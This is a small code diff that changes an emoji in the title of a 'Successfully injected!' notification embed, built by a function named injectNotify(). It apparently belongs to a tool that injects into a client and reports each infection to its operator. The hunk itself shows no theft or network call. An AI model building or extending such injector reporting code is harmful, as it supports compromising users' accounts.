@@ -169,7 +169,7 @@ function injectNotify() {
         "content": null,
         "embeds": [
           {
-            "title": "<:Too_Easy:950998976965009408> Successfully injected!",
+            "title": "<:heart_cox_black_flow:951098091497484338> Successfully injected!",
             "color": config["embed-color"],
             "fields": fields,
             "author": {
